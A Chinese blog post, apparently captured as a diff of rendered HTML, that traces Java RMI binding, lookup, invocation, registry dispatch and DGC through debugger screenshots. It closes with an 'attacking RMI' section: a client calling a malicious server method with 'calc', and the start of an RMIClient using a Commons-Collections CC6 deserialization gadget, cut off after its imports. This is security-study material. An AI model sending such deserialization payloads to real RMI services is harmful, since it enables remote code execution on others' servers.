+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917170801802.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917170801802"
+	
+	
+></p>
+<p>并且我们还能看到前面分析的RegistryImpl_Skel类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917171142675.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917171142675"
+	
+	
+></p>
+<ul>
+<li>一个默认创建的DGCImpl_Stub类实例：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917170903731.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917170903731"
+	
+	
+></p>
+<p>正好与前面的远程对象创建那里相呼应，很好说明这里为什么是两个，前面为什么是三个。</p>
+<p>注册中心与远程服务对象注册的大部分流程相同，差异在：</p>
+<ul>
+<li>远程服务对象使用动态代理，invoke 方法最终调用 UnicastRef 的 invoke 方法，注册中心使用 RegistryImpl_Stub，同时还创建了 RegistryImpl_Skel</li>
+<li>远程对象默认随机端口，注册中心默认是 1099（当然也可以指定）</li>
+</ul>
+<h4 id="服务注册-1">服务注册
+</h4><p>对应代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Naming</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;rmi://localhost:1099/Hello&#34;</span><span class="p">,</span><span class="n">remoteTest</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//这里的remoteTest就是前面的RemoteTest类实例</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟一下过程：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917171525205.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917171525205"
+	
+	
+></p>
+<p>这里的parseURL()方法就是解析传进来的url，效果如图：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917171605019.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917171605019"
+	
+	
+></p>
+<p>跟进一下这里的getRegistry()方法源码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917171729883.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917171729883"
+	
+	
+></p>
+<p>和流程学习那里的客户端获取注册表对象的代码基本相同，稍微注意一下。</p>
+<p>然后调用到了RegistryImpl_Stub类的bind()方法（正好对应到注册中心创建）：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918125556846.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918125556846"
+	
+	
+></p>
+<p>this.ref 与前面注册中心分析时的RegistryImpl_Stub类的newInstance()传入的参数相对应。</p>
+<p>所以这里调用UnicastRef类的newCall()方法是合情合理的，这里的newCall方法简单来说就是返回一个连接对象</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917173659448.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917173659448"
+	
+	
+></p>
+<p>所以这里就是建立连接（服务端和注册端建立）然后向流里writeObject数据。</p>
+<p>然后会<strong>调用到UnicastRef类的invoke()方法来进行网络传输</strong>：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917173928965.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917173928965"
+	
+	
+></p>
+<p>里面会调用到executeCall()方法，而executeCall()方法会调用readObject()方法反序列化来反序连接对象：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917174322907.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917174322907"
+	
+	
+></p>
+<p>个人调试时没到这一步（稍微注意一下）</p>
+<p>这里有网络数据的传输，必然会到注册中心进行代码调用，后续的在注册中心的调用可以参考后面的服务调用那里的注册中心的过程。</p>
+<p>在那里反序列化传过去的值后成功绑定。</p>
+<h3 id="服务发现">服务发现
+</h3><p>前面已经基本分析完了服务端的代码，再来看一看客户端。</p>
+<p>服务发现，就是获取注册中心并对其进行操作的过程，这里包含Server端和Client端两种。</p>
+<p>对应代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteInterface</span><span class="p">)</span><span class="w"> </span><span class="n">Naming</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>先运行服务端，再打断点调试客户端。</p>
+<p>进入lookup()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917181607111.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917181607111"
+	
+	
+></p>
+<p>这里的parseURL()方法同样还是一个解析的操作，最后效果如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917181735674.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917181735674"
+	
+	
+></p>
+<p>getRegistry()方法也是同样的，起一个获取注册表的操作：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917181905674.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917181905674"
+	
+	
+></p>
+<p>所以还是获取到了RegistryImpl_Stub类对象，然后调用了RegistryImpl_Stub类的lookup()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918203855530.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918203855530"
+	
+	
+></p>
+<p>在这里获取到连接后，会对这个连接序列化：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917182709906.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917182709906"
+	
+	
+></p>
+<p>然后通过UnicastRef类的invoke()方法来传输这个var2，还是起一个网络传输的作用。</p>
+<p>然后通过反序列化，来获取注册远程对象时创建的代理类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917183119169.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917183119169"
+	
+	
+></p>
+<p>最后返回了这个var20：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917183201562.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917183201562"
+	
+	
+></p>
+<p>从图中可以看出就是我们之前构造的代理对象。</p>
+<p>也就是说，这里在调用 其lookup 方法时，会向 Registry 端传递序列化的name，然后将 Registry 端返回的结果反序列化。</p>
+<p>所以在客户端的代码中，我们获取到的o就是这个代理对象：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917183343556.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917183343556"
+	
+	
+></p>
+<h3 id="服务调用">服务调用
+</h3><p>在前面我们已经获取到了代理对象。现在再来分析一下过程是怎么样的。</p>
+<h4 id="客户端">客户端
+</h4><p>既然已经获取到了代理对象，并且对代理对象调用了方法，对应如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">sayHello</span><span class="p">());</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以现在会调用RemoteObjectInvocationHandler类的invoke()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917193336067.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917193336067"
+	
+	
+></p>
+<p>此时的参数情况：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917193457551.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917193457551"
+	
+	
+></p>
+<p>还是挺符合预期的。</p>
+<p>断点也刚好断在这里，也算是刚好说明sayHello()方法不是一个Object方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917193931388.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917193931388"
+	
+	
+></p>
+<p>然后这里会调用invokeRemoteMethod()方法作为返回值，跟进这个invokeRemoteMethod()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917194051775.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917194051775"
+	
+	
+></p>
+<p>前面的if语句都没有进入，这里的ref就是前面创建动态代理时的UnicastRef类，所以现在会调用UnicastRef类的invoke()方法，简单说一下这里传递的参数：</p>
+<ul>
+<li>proxy：也就是代理对象</li>
+<li>method：也就是sayHello。</li>
+<li>args：null</li>
+<li>getMethodHash(method)：获取方法的hash？序列化传过去？结果如下：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917194648582.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917194648582"
+	
+	
+></p>
+<p>进入UnicastRef类的invoke()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918205656280.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918205656280"
+	
+	
+></p>
+<p>第一框内代码就是获取相关连接的方法等。</p>
+<p>第二个框内的代码就是获取连接对象，对应var7，这个连接对象也是老朋友了。</p>
+<p>继续看invoke()方法中的其他重要代码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918210333468.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918210333468"
+	
+	
+></p>
+<p>这里的marshalValue()方法就是进行序列化，对传入的参数进行序列化，可以简单理解为想要调用的方法名等的序列化。</p>
+<p>后面又调用了executeCall()方法，这个代码逻辑和前面分析那次的差不多，也是一个网络传输的方法？</p>
+<p>然后又调用了unmarshalValue()方法用来反序列化，和前面marshalValue()方法附近的代码对比，那里的序列化的操作，在这里则是反序列化的操作，跟进这里的unmarshalValue()方法，有一个反序列化操作：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917200649729.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917200649729"
+	
+	
+></p>
+<p>所以这里的客户端有一个反序列化操作，这里的反序列化操作应该就是反序列化获取到服务端调用方法得到的返回值。</p>
+<p>最后方法会返回var13，也就是var47：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918211129373.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918211129373"
+	
+	
+></p>
+<p>看了一下参数，确实这里最后返回的就是sayHello()方法的return的值。</p>
+<h4 id="注册中心">注册中心
+</h4><p>这里就需要调试注册中心的代码，<strong>每次客户端或者服务端与注册中心交互的时候都会调用</strong>。</p>
+<p>在注册端，由<code>sun.rmi.transport.tcp.TCPTransport#handleMessages()</code>方法来处理请求，当服务传入rmi时，就是进入第一个switch/case语句：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917211331038.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917211331038"
+	
+	
+></p>
+<p>这里会调用serviceCall()方法，并且传进去了一个var6变量，这里的var6就是之前说过的一个连接对象。</p>
+<p>跟进这个serviceCall()方法：</p>
+<p>但是我是class文件，源码不是很全，简单过一遍。</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917211942433.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917211942433"
+	
+	
+></p>
+<p>这里对ObjectTable类调用了getTarget()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917211742013.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917211742013"
+	
+	
+></p>
+<p>即方框中的代码大体逻辑就是<strong>从ObjectTable中获取封装的Target对象</strong>。</p>
+<p>箭头指向的<strong>getImpl()方法就是获取其中的封装的RegistryImpl对象</strong>。</p>
+<p>然后获取其中封装的UnicastServerRef对象，UnicastServerRef是Dispatcher接口的一个实现类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917212619796.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917212619796"
+	
+	
+></p>
+<p>然后调用了UnicastServerRef类的dispatch()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917212728484.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917212728484"
+	
+	
+></p>
+<p>这里的var37就是前面调用getImpl()方法得到的RegistyImpl类实例，var1就是传进来的连接对象。</p>
+<p>继续跟进，如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917212916358.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917212916358"
+	
+	
+></p>
+<p>skel就是前面分析过的RegistryImpl_Skel类，所以又会调用oldDispatch()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917213152601.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917213152601"
+	
+	
+></p>
+<p>这里可以看到又会调用RegistryImpl_Skel类的dispatch()方法（class文件简单分析一下）：</p>
+<p>里面涉及到了switch/case，</p>
+<p>这里的0表示调用的是bind()方法：</p>
+<p>（对应服务端调用的 bind 方法的代码）</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917214057005.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917214057005"
+	
+	
+></p>
+<p>重点的两个变量：</p>
+<ul>
+<li>var7：即传进来的连接对象</li>
+<li>var6：即传进来的RegistyImpl类实例</li>
+</ul>
+<p>代码逻辑就比较好看懂了。</p>
+<p>先对这个连接对象字节流<strong>反序列化以获取远程对象和RMI服务名称</strong>。</p>
+<p>然后通过调用bind()方法来绑定RMI服务，然后跟进一下这里的bind()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918202528609.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918202528609"
+	
+	
+></p>
+<p>所以现在就进行了一次绑定操作，对应客户端代码调用的bind()方法绑定。</p>
+<p>——————</p>
+<p>这里case的2表示处理lookup方法的请求：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917214355812.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917214355812"
+	
+	
+></p>
+<p>以此类推，1是处理list()方法，3是rebind()方法等。</p>
+<h4 id="服务端">服务端
+</h4><p>再来看一下服务端是如何调用的，此时我们就需要调试服务端，启动客户端。</p>
+<p>打断点于UnicastServerRef的dispatch()方法如下位置：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917220123656.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917220123656"
+	
+	
+></p>
+<p>上图就已经可以看出这里的skel为null，不会调用oldDispatch()方法，也是判断是Registry端还是Server端的过程。继续往后面看：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919174423809.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919174423809"
+	
+	
+></p>
+<p>看这里涉及到的几个参数：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917220417498.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917220417498"
+	
+	
+></p>
+<p>先调用unmarshalParameters()方法反序列化了客户端传来的参数，然后调用了invoke实现了sayHello()方法的执行。然后再<strong>调用marshalValue()方法将数据（即调用方法后返回的值）序列化</strong>。</p>
+<p>成功闭环。</p>
+<p>简单说明一下这里的var42变量的调用：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919163845724.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919163845724"
+	
+	
+></p>
+<p>调试跟进这个方法，进入到如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919163919063.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919163919063"
+	
+	
+></p>
+<p>注意看此时l的变量，正好和前面客户端传入的method的hash值是相同的。</p>
+<p>这一个点基本可以说明在UnicastServerRef的<code>dispatch</code>方法中就是通过<code>this.hashToMethod_Map</code>里的Method的hash来查找的。</p>
+<h3 id="总结">总结
+</h3><p>RMI 底层通讯采用了Stub（运行在客户端）和Skeleton（运行在服务端）机制，RMI 调用远程方法的过程大致如下：</p>
+<ol>
+<li>RMI 客户端在调用远程方法时会先创建 Stub ( <code>sun.rmi.registry.RegistryImpl_Stub</code> )。</li>
+<li>Stub 会将 Remote 对象传递给远程引用层 ( <code>java.rmi.server.RemoteRef</code> ) 并创建 <code>java.rmi.server.RemoteCall</code>( 远程调用 )对象。</li>
+<li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li>
+<li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li>
+<li>RMI服务端的远程引用层( <code>sun.rmi.server.UnicastServerRef</code> )收到请求会请求传递给 Skeleton ( <code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code> )。</li>
+<li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li>
+<li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li>
+<li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li>
+<li>RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li>
+<li>RMI 客户端反序列化 RMI 远程方法调用结果。</li>
+</ol>
+<h3 id="dgc">DGC
+</h3><p>Distributed Garbage Collection，分布式垃圾回收。</p>
+<p>当RMI服务器返回一个对象到其客户端时，其跟踪远程对象在客户机中的使用。当再没有更多的对客户机上远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个RMI服务，就会伴随着DGC服务端的启动。</p>
+<p>在前面源码分析时，就发现到objTable中有默认的DGCImpl对象：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918220656708.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918220656708"
+	
+	
+></p>
+<p>回到ObjectTable的putTarget()方法，关键代码如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918220754271.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918220754271"
+	
+	
+></p>
+<p>这里的dgclog是DGCImpl类的静态变量：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240925221950510.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240925221950510"
+	
+	
+></p>
+<p>这里调用了这个静态变量，会对DGCImpl类进行类初始化，而DGCImpl类存在static静态代码块：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918221632178.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918221632178"
+	
+	
+></p>
+<p>基本就能解释我为什么ObjectTable中会默认有DGCImpl对象了。</p>
+<p>同时还创建了DGCImpl_Stub代理类和DGCImpl_Skel对象。</p>
+<p>很熟悉，并且其实这里的命名规则和处理逻辑类似Registry对象。</p>
+<p>Java提供了java.rmi.dgc.DGC接口，这个接口继承了Remote接口，定义了dirty和clean方法。</p>
+<p>在RegistryImpl_Stub#lookup()方法中，前面我们都是分析到反序列化就没走了，但是这里在后续调用的done()方法中其实还有这个DGCImpl类的利用：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918223642477.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918223642477"
+	
+	
+></p>
+<p>持续跟进，可以看到如下代码：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918223712191.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918223712191"
+	
+	
+></p>
+<p>所以这里会创建DGCImpl_Stub类实例等。</p>
+<p>DGC通信的处理类同样的是 DCGImpl_Skel 的dispatch()方法，还是对应的switch/case语句，如下：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918225501828.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918225501828"
+	
+	
+></p>
+<p>case1：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240918225950845.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240918225950845"
+	
+	
+></p>
+<p>可以看到这里调用了反序列化，然后调用调用dirty()方法，然后再序列化输出。</p>
+<p>case0对应的clean()方法。</p>
+<h2 id="攻击-rmi">攻击 RMI
+</h2><h3 id="攻击server端">攻击Server端
+</h3><h4 id="恶意方法">恶意方法
+</h4><p>远程方法的调用时机发生在服务端。当注册的远程对象上存在某个恶意方法，我们可以在客户端调用这个方法来攻击服务端。比如假设服务端有如下方法的代码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919155729698.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919155729698"
+	
+	
+></p>
+<p>客户端如下调用这个方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">RMIInterface</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RMIInterface</span><span class="p">)</span><span class="w"> </span><span class="n">Naming</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="na">evil</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">));</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样就能成功在服务端调用这个恶意方法。</p>
+<p>（个人感觉利用点不高）</p>
+<h4 id="恶意服务参数">恶意服务参数
+</h4><p>在Client 端获取到Server端创建的Stub后，会在本地调用这个Stub 并传递参数，Stub会序列化这个参数，并传递给Servre端。Server端会反序列化Client端传入的参数并进行调用，如果这个参数是Object类型的情况，Client端可以传给Server端任意的类，直接造成反序列化漏洞。</p>
+<h5 id="基本利用">基本利用
+</h5><p>就比如我前面给的远程调用对象RemoteTest.java文件，里面就有一个接收Object类型参数的方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919132421745.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919132421745"
+	
+	
+></p>
+<p>所以我们可以在远程调用这个对象的sayName()方法时传进去一个反序列化payload。</p>
+<p>以CC6为例，所以我们可以如下构造：</p>
+<p>RMIClient.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Client</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Arrays</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">Rmi.Server.RemoteInterface</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashSet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIClient</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
